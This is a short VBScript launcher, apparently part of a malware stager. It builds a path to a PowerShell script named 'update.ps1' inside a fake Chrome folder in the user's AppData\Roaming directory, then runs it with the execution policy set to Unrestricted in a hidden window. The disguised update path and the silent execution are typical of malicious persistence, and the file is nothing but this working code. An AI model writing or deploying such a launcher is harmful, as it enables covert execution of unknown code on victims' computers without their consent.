strUser = CreateObject("WScript.Network").UserName
path = "C:\Users\" + strUser + "\AppData\Roaming\Chrome\appData\update.ps1"

command = "powershell.exe -nologo -ExecutionPolicy Unrestricted -File " + path
set shell = CreateObject("WScript.Shell")
shell.Run command,0